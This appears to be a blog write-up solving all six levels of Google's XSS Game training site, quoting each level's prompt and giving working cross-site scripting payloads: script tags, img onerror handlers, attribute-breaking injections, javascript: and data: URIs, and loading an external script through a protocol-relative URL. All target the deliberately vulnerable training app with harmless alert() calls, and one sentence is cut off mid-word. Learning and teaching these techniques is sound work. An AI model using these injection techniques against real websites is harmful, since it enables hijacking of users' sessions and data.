---
layout: post
title: Google XSS Game
---
Google XSS Game can be located at [xss-game.appspot.com](https://xss-game.appspot.com/).

## Prompt
Warning: You are entering the XSS game area
Welcome, recruit!
Cross-site scripting (XSS) bugs are one of the most common and dangerous types of vulnerabilities in Web applications. These nasty buggers can allow your enemies to steal or modify user data in your apps and you must learn to dispatch them, pronto!

At Google, we know very well how important these bugs are. In fact, Google is so serious about finding and fixing XSS issues that we are paying mercenaries up to $7,500 for dangerous XSS bugs discovered in our most sensitive products.

In this training program, you will learn to find and exploit XSS bugs. You'll use this knowledge to confuse and infuriate your adversaries by preventing such bugs from happening in your applications.

There will be cake at the end of the test.

## [1/6]  Level 1: Hello, world of XSS
This level demonstrates a common cause of cross-site scripting where user input is directly included in the page without proper escaping.

Interact with the vulnerable application window below and find a way to make it execute JavaScript of your choosing. You can take actions inside the vulnerable window or directly edit its URL bar.

Inject a script to pop up a JavaScript `alert()` in the frame below.

Once you show the alert you will be able to advance to the next level.

<iframe width="100%" height="175" src="https://xss-game.appspot.com/level1/frame" title="Level1"></iframe>

Simply enter the following into the field: `<script>alert("xss")</script>`.

## [2/6]  Level 2: Persistence is key
Web applications often keep user data in server-side and, increasingly, client-side databases and later display it to users. No matter where such user-controlled data comes from, it should be handled carefully.

This level shows how easily XSS bugs can be introduced in complex apps.

Inject a script to pop up an `alert()` in the context of the application.

Note: the application saves your posts so if you sneak in code to execute the alert, this level will be solved every time you reload it.

<iframe width="100%" height="175" src="https://xss-game.appspot.com/level2/frame" title="Level2"></iframe>

I first tried `<iframe src="javascript:alert(1);"></iframe>`. While it triggered XSS, it was not the answer the challenge was looking for. Instead, have a broken link to an image and run XSS on error: `<img src='#' onerror=alert(1) />`.

## [3/6]  Level 3: That sinking feeling...
As you've seen in the previous level, some common JS functions are execution sinks which means that they will cause the browser to execute any scripts that appear in their input. Sometimes this fact is hidden by higher-level APIs which use one of these functions under the hood.

The application on this level is using one such hidden sink.

As before, inject a script to pop up a JavaScript `alert()` in the app.

Since you can't enter your payload anywhere in the application, you will have to manually edit the address in the URL bar below.

<iframe width="100%" height="350" src="https://xss-game.appspot.com/level3/frame#1" title="Level3"></iframe>

If we read the source code, we can find an injection point.
```js
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
```
Because the browser won't execute scripts added after the page has loaded, we cannot add `<script>` tags. But, we can add an `onerror` attribute to the `<img>` through the `num` variable. `num` is the parameter passed into the `chooseTab()` function. 

```js
window.onload = function() {
	chooseTab(unescape(self.location.hash.substr(1)) || "1");
}
```
On load, `unescape(self.location.hash.substr(1)) || "1"` is passed into `chooseTab()`. `unescape()` removes URL encoding. `self.location` is the URL and `self.location.hash` returns the [anchor part of the URL](https://www.w3schools.com/JSREF/prop_loc_hash.asp). `self.location.hash.substr(1)` returns everything after the `#` mark. So if there is nothing after the anchor, it defaults to the first image/tab.

Now, onto the injection. We need to add `onerror`, trigger an error with a broken link, and comment out what we don't need.

```js
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
// becomes
html += "<img src='/static/level3/cloud" + "' onerror='alert(1)'/>//" + ".jpg' />";
// which is equivalent to
html += "<img src='/static/level3/cloud" + "' onerror='alert(1)'/>//.jpg' />";
// which creates the following tag
<img src='/static/level3/cloud' onerror='alert(1)'/>
//src='/static/level3/cloud' will trigger an error because there is no image there
```
Injecting `'onerror='alert(1)'/>//` after the hash in the URL will solve the challenge. You can also put any string before the first `'` because that will also trigger an error. Just navigate to https://xss-game.appspot.com/level3/frame#'onerror='alert(1)'/>//.

You could also inject `'onerror='alert(1)//`:
```js
// Turn this
html += "<img src='/static/level3/cloud" + num + ".jpg' />";
// into 
html += "<img src='/static/level3/cloud" + "'onerror='alert(1)//" + ".jpg' />";
// which creates the following tag
<img src='/static/level3/cloud' onerror='alert(1)//.jpg'/>
```
This also solves the challenge but is less clean.

## [4/6]  Level 4: Context matters
Every bit of user-supplied data must be correctly escaped for the context of the page in which it will appear. This level shows why.

Inject a script to pop up a JavaScript `alert()` in the application.

<iframe width="100%" src="https://xss-game.appspot.com/level4/frame" title="Level4"></iframe>

Clicking the `Create timer` button opens timer.html. When loading.gif is loaded, the `startTimer()` function is called and the contents of the `timer` input field are passed into the function.
```js
<img src="/static/loading.gif" onload="startTimer('{{ timer }}');" />
```
Afterward `startTimer()` will `parseInt()` the input and will otherwise default to a 3 second timer. The the contents of `timer` will also be returned in a `<div>` but no code will be executed.
```js
<div id="message">Your timer will execute in {{ timer }} seconds.</div>
```
We can, however, inject into the original `onload` script and append arbitrary javascript.
```js
onload="startTimer('{{ timer }}');"
onload="startTimer('3');alert('1');"
```
An injection of `X');alert('1` will pass some value `X` into the `startTimer()` function, and then execute `alert('1')`.

## [5/6]  Level 5: Breaking protocol
Cross-site scripting isn't just about correctly escaping data. Sometimes, attackers can do bad things even without injecting new elements into the DOM.

Inject a script to pop up an `alert()` in the context of the application.

<iframe width="100%" height="250" src="https://xss-game.appspot.com/level5/frame/welcome" title="Level5"></iframe>

In signup.html, `Next >>` is hyperlinked to the value of the parameter `next` passed through the URL, e.g. `/signup?next=confirm`.
```
<a href="{{ next }}">Next >></a>
```
We can inject code into the URL parameter to take control of the effects of the `Next >>`link. Navigate here: https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1). Then, click the hyperlink. Done!

## [6/6]  Level 6: Follow the 🐇
Complex web applications sometimes have the capability to dynamically load JavaScript libraries based on the value of their URL parameters or part of location.hash.

This is very tricky to get right -- allowing user input to influence the URL when loading scripts or other potentially dangerous types of data such as XMLHttpRequest often leads to serious vulnerabilities.

Find a way to make the application request an external file which will cause it to execute an `alert()`.

<iframe width="100%" height="200" src="https://xss-game.appspot.com/level6/frame#/static/gadget.js" title="Level6"></iframe>

The value after `#` in the URL is used as the gadget filename, and passed into `includeGadget()`.
```js
function getGadgetName() { 
  return window.location.hash.substr(1) || "/static/gadget.js";
}

includeGadget(getGadgetName());
```
### Easier - Data URI Solution
[Data URIs](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URIs) allow HTML tags to be created with inline content, rather than reaching out to and making an additional request to the server. For example, an inline image might look like:
```
<img src="data:image/png;base64,iVBORw0KGgoAAAA..."/>
```
So, if we want to run JS we can actually inject either of these after the `#`:
```
data:text/html,<script>alert('hi');</script>
data:text/javascript,alert(1)
```
### Harder - Hosted JS File
The code seems to assume we'll be passing in a URL where we are hosting a JS file. The file need only contain the line `alert()`. 

We could host an HTTP server: `python3 -m http.server 80`. The file would then be at `http://<your-ip>/<file.js>`.

We could paste our `alert(1)` script into pastebin, and grab the link (e.g. `https://pastebin.com/raw/******`).

The simplest way however, is to use [Google's JavaScript API Loader, aka `jsapi`](https://www.petefreitag.com/item/683.cfm). You can call a specific JS function (like `alert()` with it:
```
https://www.google.com/jsapi?callback=alert
```
The trouble is the RegEx in the code trying to identify URLs: `url.match(/^https?:\/\//)`. If you want to analyze RegEx for vulnerability, it's easiest to check some permutations on a RegEx Tester website. You can check the matches for yourself here: [regex101](https://regex101.com/r/KvPkNW/1).
```
^ asserts position at start of a line
http matches the characters http literally (case sensitive)
s? matches the character s literally (case sensitive)
? Quantifier — Matches between zero and one times, as many times as possible, giving back as needed (greedy)
: matches the character : literally (case sensitive)
\/ matches the character / literally (case sensitive)
\/ matches the character / literally (case sensitive)
```
If we use an address without specifying the protocol at all, it could work (e.g. www.example.com instead of http://www.example.com). Or, because the protocol will be inherited from whichever page you're on, you can preface with just `//` and no `http:`. We could also use a single or multiple uppercase characters (e.g. `hTtp://, HTTP://`) because the [first part of a URL--the location--is case insensitive](https://webmasters.stackexchange.com/a/90378). We ca

So a possible solution will look like:
```
https://xss-game.appspot.com/level6/frame#//www.google.com/jsapi?callback=alert
```
## Resources

[XSS Filter Evasion Cheatsheet](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)

[Location hash Property](https://www.w3schools.com/JSREF/prop_loc_hash.asp)

[The 'javascript' resource identifier scheme](https://tools.ietf.org/html/draft-hoehrmann-javascript-scheme-00)

[A Novel CSP Bypass Using data: URI](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2019/april/a-novel-csp-bypass-using-data-uri/)

[Why are URLs case-sensitive?](https://webmasters.stackexchange.com/a/90378)

[Uniform Resource Identifier (URI): Generic Syntax](https://tools.ietf.org/html/rfc3986)